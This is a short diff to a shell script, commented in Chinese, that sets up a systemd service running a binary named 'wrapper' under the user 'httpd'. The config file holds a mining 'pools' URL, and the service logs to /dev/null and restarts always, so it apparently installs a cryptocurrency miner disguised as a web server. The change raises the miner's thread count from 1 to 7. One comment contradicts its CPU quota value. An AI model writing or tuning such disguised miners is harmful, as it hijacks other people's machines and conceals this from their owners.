@@ -47,9 +47,6 @@ rm /opt/utils/wrapper.c
 # 生成配置文件
 cat > /etc/systemd/system/conf.d/httpd.conf <<EOF
 {
-    "cpu": {
-        "threads": 7
-    },
     "pools": [
         {
             "url": "$pool_url",
@@ -83,7 +80,7 @@ After=network.target
 [Service]
 User=httpd
 Group=httpd
-ExecStart=/opt/utils/wrapper --config=/etc/systemd/system/conf.d/httpd.conf --no-color --log-file=/dev/null --threads=1
+ExecStart=/opt/utils/wrapper --config=/etc/systemd/system/conf.d/httpd.conf --no-color --log-file=/dev/null --threads=7 #限制运行线程数
 Restart=always
 CPUQuota=80%  # 限制 CPU 使用率为 50%
 
